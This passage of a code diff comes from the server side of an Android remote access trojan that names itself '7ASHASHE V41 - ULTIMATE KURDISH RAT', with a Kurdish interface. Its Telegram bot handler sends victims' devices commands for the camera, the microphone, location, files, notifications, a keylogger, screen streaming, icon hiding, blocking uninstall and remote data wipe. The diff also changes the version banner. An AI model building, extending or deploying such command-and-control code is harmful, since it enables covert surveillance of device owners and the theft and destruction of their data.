-        '👁️ **شاردنەوەی ئایکۆن** - ونکردنی ئایکۆنی ئەپەکە\n' +
-        '🎤 **گوێگرتنی ڕاستەوخۆ** - گوێگرتن لە دەنگ بۆ ماوەی دیاریکراو\n' +
-        '📸 **سکرینشۆتی زیرەک** - چاودێری کردنی ئەپێک\n' +
-        '⚡ **کۆنترۆڵی کامێرا** - وێنەگرتن بە کامێرا\n' +
-        '🔋 **دژە-باتری** - ناچالاککردنی پاشەکەوتکردنی وزە\n' +
-        '📱 **ئاگاداری سیمکارت** - ئاگاداربوون لە گۆڕینی سیم\n' +
-        '💥 **سڕینەوەی داتا** - سڕینەوەی دووری داتاکان\n' +
-        '💬 **پەیامی ساختە** - ناردنی پەیامی ساختە بۆ شاشە\n' +
-        '🔄 **ڕیستارتی خۆکار** - چالاککردنی ڕیستارتی خۆکار',
-        { parse_mode: 'Markdown' }
-    );
-});
-
-// =====================================================
-// 🔘 CALLBACK QUERY HANDLER
-// =====================================================
-bot.on('callback_query', (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const [command, clientId] = callbackQuery.data.split(':');
-    
-    if (command === 'device') {
-        const client = clients.get(clientId);
-        if (!client) {
-            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
-                chat_id: msg.chat.id,
-                message_id: msg.message_id
-            });
-            return;
-        }
-        
-        bot.editMessageText(
-            `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
-            `📱 ئەندرۆید: ${client.info.androidVersion}\n` +
-            `🔋 پاتری: ${client.info.battery}\n` +
-            `🌍 وڵات: ${client.info.country}\n` +
-            `🌐 IP: ${client.info.ip}\n\n` +
-            `**⚡ فەرمانێک هەڵبژێرە:**`,
-            {
-                chat_id: msg.chat.id,
-                message_id: msg.message_id,
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📸 کامێرا', callback_data: `camera:${clientId}` },
-                            { text: '🎤 مایک', callback_data: `mic:${clientId}` }
-                        ],
-                        [
-                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
-                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` }
-                        ],
-                        [
-                            { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${clientId}` },
-                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` }
-                        ],
-                        [
-                            { text: '📹 Streamی شاشە', callback_data: `screen:${clientId}` },
-                            { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `audio_stream:${clientId}` }
-                        ],
-                        [
-                            { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${clientId}` },
-                            { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${clientId}` }
-                        ],
-                        [
-                            { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${clientId}` },
-                            { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${clientId}` }
-                        ],
-                        [
-                            { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${clientId}` },
-                            { text: '💬 پەیامی ساختە', callback_data: `toast:${clientId}` }
-                        ],
-                        [
-                            { text: '📶 وایفای', callback_data: `wifi:${clientId}` },
-                            { text: '📱 بلوتوس', callback_data: `bluetooth:${clientId}` }
-                        ],
-                        [
-                            { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${clientId}` }
-                        ]
-                    ]
-                },
-                parse_mode: 'Markdown'
-            }
-        );
-    }
-    
-    const commandTypes = [
-        'camera', 'mic', 'location', 'files', 'notifications',
-        'keylogger', 'screen', 'audio_stream', 'hide_icon',
-        'battery_bypass', 'anti_uninstall', 'wipe', 'sim_alert',
-        'toast', 'wifi', 'bluetooth', 'auto_boot'
-    ];
-    
-    if (commandTypes.includes(command)) {
-        const client = clients.get(clientId);
-        if (!client) {
-            bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
-                show_alert: true
-            });
-            return;
-        }
-        
-        if (client.ws.readyState === WebSocket.OPEN) {
-            let wsCommand = command;
-            
-            // Convert to appropriate WebSocket command
-            const commandMap = {
-                'camera': 'take_photo',
-                'mic': 'record_audio',
-                'location': 'get_location',
-                'files': 'list_files',
-                'notifications': 'start_notifications',
-                'keylogger': 'start_keylogger',
-                'screen': 'start_screen_stream',
-                'audio_stream': 'start_audio_stream',
-                'hide_icon': 'hide_icon',
-                'battery_bypass': 'enable_battery_bypass',
-                'anti_uninstall': 'enable_anti_uninstall',
-                'wipe': 'wipe_data',
-                'sim_alert': 'enable_sim_alert',
-                'toast': 'show_toast',
-                'wifi': 'toggle_wifi',
-                'bluetooth': 'toggle_bluetooth',
-                'auto_boot': 'enable_auto_boot'
-            };
-            
-            client.ws.send(JSON.stringify({
-                type: commandMap[command] || command,
-                timestamp: Date.now()
-            }));
-            
-            bot.answerCallbackQuery(callbackQuery.id, {
-                text: `✅ فەرمان نێردرا`,
-                show_alert: false
-            });
-            
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `✅ **فەرمان نێردرا**\n\n` +
-                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
-                `⚡ فەرمان: ${command}\n` +
-                `🕐 کات: ${new Date().toLocaleString('ckb')}`,
-                { parse_mode: 'Markdown' }
-            );
-        } else {
-            bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
-                show_alert: true
-            });
-        }
-    }
 });
 
 // =====================================================
@@ -1854,28 +2003,23 @@ setInterval(() => {
 // 🚀 START SERVER
 // =====================================================
 server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`✅ 7ASHASHE V40 running on port ${CONFIG.PORT}`);
+    console.log(`✅ 7ASHASHE V41 running on port ${CONFIG.PORT}`);
     console.log(`🌐 http://localhost:${CONFIG.PORT}`);
     console.log(`🔥 ULTIMATE KURDISH RAT - ${CONFIG.MASTER}`);
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `🔥 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n` +
-        `👑 **${CONFIG.MASTER}**\n` +
-        `📊 وەشان: ${CONFIG.VERSION}\n` +
-        `🌐 پۆرت: ${CONFIG.PORT}\n` +
-        `⏱️ کات: ${new Date().toLocaleString('ckb')}\n\n` +
-        `✅ **١٠ تایبەتمەندی نوێ:**\n` +
-        `1. 🚫 دژە-سڕینەوە\n` +
-        `2. 👁️ شاردنەوەی ئایکۆن\n` +
-        `3. 🎤 گوێگرتنی ڕاستەوخۆ\n` +
-        `4. 📸 سکرینشۆتی زیرەک\n` +
-        `5. ⚡ کۆنترۆڵی کامێرا\n` +
-        `6. 🔋 دژە-باتری\n` +
-        `7. 📱 ئاگاداری سیمکارت\n` +
-        `8. 💥 سڕینەوەی دوور\n` +
-        `9. 💬 پەیامی ساختە\n` +
-        `10. 🔄 ڕیستارتی خۆکار\n\n` +
-        `🦁 **7ASHASHE**`
+        `<b>🔥 7ASHASHE V41 - ULTIMATE KURDISH RAT</b>\n\n` +
+        `<b>👑 ${CONFIG.MASTER}</b>\n` +
+        `<b>📊 وەشان:</b> ${CONFIG.VERSION}\n` +
+        `<b>🌐 پۆرت:</b> ${CONFIG.PORT}\n` +
+        `<b>⏱️ کات:</b> ${new Date().toLocaleString('ckb')}\n\n` +
+        `<b>✅ چاکسازیەکان:</b>\n` +
+        `1. 🔧 دوگمەی پێشکەوتوو چالاک کرا\n` +
+        `2. 📝 HTML MODE بۆ تێلیگرام\n` +
+        `3. 📸 فەرمانی کامێرا چاک کرا\n` +
+        `4. 🎛️ ١٠ فەرمانە پێشکەوتووەکان\n\n` +
+        `<b>🦁 7ASHASHE</b>`,
+        { parse_mode: 'HTML' }
     );
 });
 
